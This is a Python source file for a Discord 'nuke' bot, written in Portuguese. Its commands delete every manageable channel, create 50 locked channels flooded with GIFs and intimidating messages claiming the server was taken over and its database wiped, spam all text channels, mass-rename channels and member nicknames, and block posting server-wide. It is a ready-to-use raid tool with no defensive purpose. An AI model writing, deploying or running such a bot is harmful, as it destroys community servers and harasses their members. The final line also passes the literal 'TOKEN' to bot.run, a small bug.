import discord
import asyncio
from discord.ext import commands
from discord import app_commands

TOKEN = 'SEU_TOKEN_AQUI'

# gifs
gifs = [
    'https://i.pinimg.com/originals/0a/ca/98/0aca980a94431dcf00fa6a67524eca24.gif',
    'https://i.pinimg.com/originals/6c/a5/bd/6ca5bd0da41f2d99d5f29f8029f1af7d.gif',
    'https://i.pinimg.com/originals/9c/c1/db/9cc1db91d61c53eb9de2989070e6ac38.gif',
]

msgs = [
    '# O̶L̶H̶O̶S̶ ̶E̶S̶C̶U̶R̶O̶S̶ ̶W̶I̶N̶S̶',
    '# A̶C̶E̶S̶S̶O̶ ̶N̶E̶G̶A̶D̶O̶ ̶A̶O̶ ̶S̶E̶R̶V̶I̶D̶O̶R̶',
    '## O choro é a única coisa que sobrou aqui. 😭',
    '# 444 444 444 444 444 444 444',
    '# 𝙵̶𝙰̶𝚉̶-̶𝙾̶-̶666-̶𝙾̶𝚄̶-̶𝚂̶𝚄̶𝙼̶𝙰̶-̶𝙳̶𝙰̶-̶𝚀̶𝚄̶𝙸̶',
    '```fix\n[SYSTEM_OVERRIDE_BY_OLHOS_ESCUROS]\n🛑 STATUS: EXTERMINADO.\n👁️ EU VEJO TUDO\n💾 DATABASE: WIPED (100%)\n⚠️  CODE_444: VOCÊ NÃO TEM MAIS ACESSO.\n"A escuridão não é o fim, é apenas o começo da nova era."```',
]

nome_canal = '〢-𝙾̶𝙻̶𝙷̶𝙾̶𝚂̶-̶𝙴̶𝚂̶𝙲̶𝚄̶𝚁̶𝙾̶𝚂̶-̶𝚃̶𝙴̶-̶𝚅̶𝙴̶𝙴̶𝙼̶-'
rodando = False
canais_criados = []

intents = discord.Intents.default()
intents.members = True
intents.guilds = True
bot = commands.Bot(command_prefix="!", intents=intents)

@bot.event
async def on_ready():
    print("bot online " + str(bot.user))
    try:
        s = await bot.tree.sync()
        print(str(len(s)) + " comandos ok")
    except Exception as e:
        print("erro " + str(e))

def tem_adm(interaction):
    return interaction.guild.me.guild_permissions.administrator

@bot.tree.command(name="nuke")
async def nuke(interaction: discord.Interaction):
    global rodando, canais_criados
    if not tem_adm(interaction):
        await interaction.response.send_message("sem adm", ephemeral=True)
        return
    rodando = True
    canais_criados = []
    await interaction.response.send_message("👁️ iniciando...", ephemeral=True)
    g = interaction.guild

    #deleta td
    dels = [c.delete() for c in g.channels if c.permissions_for(g.me).manage_channels]
    await asyncio.gather(*dels, return_exceptions=True)

    async def fazer_canal():
        try:
            c = await g.create_text_channel(nome_canal)
            await c.edit(overwrites={
                g.default_role: discord.PermissionOverwrite(view_channel=True, read_message_history=True, send_messages=False, mention_everyone=False),
                g.me: discord.PermissionOverwrite(send_messages=True, mention_everyone=True, view_channel=True)
            })
            canais_criados.append(c)
            for i, m in enumerate(msgs):
                await c.send(gifs[i % len(gifs)])
                await c.send(m)
        except Exception as e:
            print("erro canal: " + str(e))

    await asyncio.gather(*[fazer_canal() for _ in range(50)])
    rodando = False

@bot.tree.command(name="clean")
async def clean(interaction: discord.Interaction):
    if not tem_adm(interaction):
        await interaction.response.send_message("sem adm", ephemeral=True)
        return
    await interaction.response.send_message("deletando...", ephemeral=True)
    dels = [c.delete() for c in interaction.guild.channels if c.permissions_for(interaction.guild.me).manage_channels]
    await asyncio.gather(*dels, return_exceptions=True)
    canais_criados.clear()

@bot.tree.command(name="spam")
async def spam(interaction: discord.Interaction):
    if not tem_adm(interaction):
        await interaction.response.send_message("sem adm", ephemeral=True)
        return
    await interaction.response.send_message("spammando...", ephemeral=True)
    cs = [c for c in interaction.guild.channels if isinstance(c, discord.TextChannel)]

    async def mandar(canal):
        try:
            for i, m in enumerate(msgs):
                await canal.send(gifs[i % len(gifs)])
                await canal.send(m)
        except: pass

    await asyncio.gather(*[mandar(c) for c in cs])
    await interaction.followup.send("feito em " + str(len(cs)) + " canais", ephemeral=True)

@bot.tree.command(name="renomear")
async def renomear(interaction: discord.Interaction):
    if not tem_adm(interaction): 
        await interaction.response.send_message("sem adm", ephemeral=True)
        return
    await interaction.response.send_message("renomeando...", ephemeral=True)
    cs = [c for c in interaction.guild.channels if isinstance(c, discord.TextChannel)]
    n = 0
    for c in cs:
        try:
            await c.edit(name=nome_canal)
            n += 1
            await asyncio.sleep(1)
        except: pass
    await interaction.followup.send(str(n) + " canais renomeados", ephemeral=True)

@bot.tree.command(name="lockdown")
async def lockdown(interaction: discord.Interaction):
    if not tem_adm(interaction):
        await interaction.response.send_message("sem adm", ephemeral=True)
        return
    await interaction.response.send_message("lockando...", ephemeral=True)
    cs = [c for c in interaction.guild.channels if isinstance(c, discord.TextChannel)]

    async def bloquear(c):
        try:
            await c.set_permissions(interaction.guild.default_role, send_messages=False, view_channel=True)
            return 1
        except: return 0

    r = await asyncio.gather(*[bloquear(c) for c in cs])
    await interaction.followup.send(str(sum(r)) + " canais lockados", ephemeral=True)

@bot.tree.command(name="nick")
@app_commands.describe(apelido="apelido pra todo mundo")
async def nick(interaction: discord.Interaction, apelido: str):
    if not tem_adm(interaction):
        await interaction.response.send_message("sem adm", ephemeral=True)
        return
    await interaction.response.send_message("mudando nicks...", ephemeral=True)
    g = interaction.guild
    n = 0
    async def mudar(m):
        nonlocal n
        try:
            if m != g.owner and m != g.me:
                await m.edit(nick=apelido)
                n += 1
        except: pass
    await asyncio.gather(*[mudar(m) for m in g.members])
    await interaction.followup.send(str(n) + " membros renomeados", ephemeral=True)

@bot.tree.command(name="topic")
@app_commands.describe(texto="texto do topico")
async def topic(interaction: discord.Interaction, texto: str):
    if not tem_adm(interaction):
        await interaction.response.send_message("sem adm", ephemeral=True)
        return
    await interaction.response.send_message("mudando topicos...", ephemeral=True)
    cs = [c for c in interaction.guild.channels if isinstance(c, discord.TextChannel)]
    n = 0
    for c in cs:
        try:
            await c.edit(topic=texto)
            n += 1
            await asyncio.sleep(0.5)
        except: pass
    await interaction.followup.send(str(n) + " canais atualizados", ephemeral=True)

@bot.tree.command(name="parar")
async def parar(interaction: discord.Interaction):
    global rodando
    rodando = False
    await interaction.response.send_message("parado", ephemeral=True)

@bot.tree.command(name="status")
async def status(interaction: discord.Interaction):
    g = interaction.guild
    await interaction.response.send_message(
        f"rodando: {'sim' if rodando else 'nao'}\n"
        f"canais: {len(g.channels)}\n"
        f"membros: {g.member_count}\n"
        f"criados pelo bot: {len(canais_criados)}",
        ephemeral=True
    )

bot.run("TOKEN")
